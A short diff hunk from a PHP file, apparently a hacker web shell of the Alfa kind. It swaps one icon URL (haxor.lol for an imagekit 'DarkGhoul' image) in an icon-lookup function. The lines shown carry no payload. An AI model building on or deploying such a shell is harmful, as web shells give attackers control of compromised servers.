@@ -1228,7 +1228,7 @@ function showAnimation($name){
 }
 function __showicon($r){
 	$s['btn']='http://haxor.lol/love/heads.png';
-	$s['alfamini']='https://haxor.lol/love/heads.png';
+	$s['alfamini']='https://ik.imagekit.io/worcihhgn/icon-seo-DarkGhoul.png';
 	$s['loader']='https://ik.imagekit.io/worcihhgn/icon-seo-DarkGhoul.png';
 	//return 'data:image/png;base64,'.__get_resource($s[$r]);
 	return $s[$r];
